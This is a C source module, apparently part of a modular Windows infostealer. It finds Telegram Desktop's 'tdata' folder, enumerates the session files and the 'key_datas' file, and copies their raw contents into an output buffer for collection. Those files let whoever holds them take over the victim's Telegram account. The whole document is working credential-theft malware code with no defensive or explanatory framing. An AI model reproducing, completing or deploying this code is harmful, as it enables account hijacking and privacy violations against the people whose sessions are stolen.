// chunk: collectors/telegram_session
// depends: core/emit_buffer, core/file_ops
// provides: collect_telegram
// headers: shlobj.h

#ifndef CHUNK_TELEGRAM_SESSION
#define CHUNK_TELEGRAM_SESSION

#include <shlobj.h>

static void collect_telegram(void) {
    char roaming[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, roaming) != S_OK) return;
    char tdata[MAX_PATH];
    snprintf(tdata, MAX_PATH, "%s\\Telegram Desktop\\tdata", roaming);
    if (!file_exists(tdata)) return;

    emitf("=== TELEGRAM ===\r\n");

    char pattern[MAX_PATH];
    snprintf(pattern, MAX_PATH, "%s\\D877F783D5D3EF8C*", tdata);
    WIN32_FIND_DATAA fd;
    HANDLE hf = FindFirstFileA(pattern, &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        do {
            char full[MAX_PATH];
            snprintf(full, MAX_PATH, "%s\\%s", tdata, fd.cFileName);
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                emitf("  session_file: %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                emit_file(full, 1*1024*1024);
            }
        } while (FindNextFileA(hf, &fd));
        FindClose(hf);
    }

    char keydata[MAX_PATH];
    snprintf(keydata, MAX_PATH, "%s\\key_datas", tdata);
    if (file_exists(keydata)) {
        emitf("  key_datas: present\r\n");
        emit_file(keydata, 512*1024);
    }
    emitf("\r\n");
}

#endif
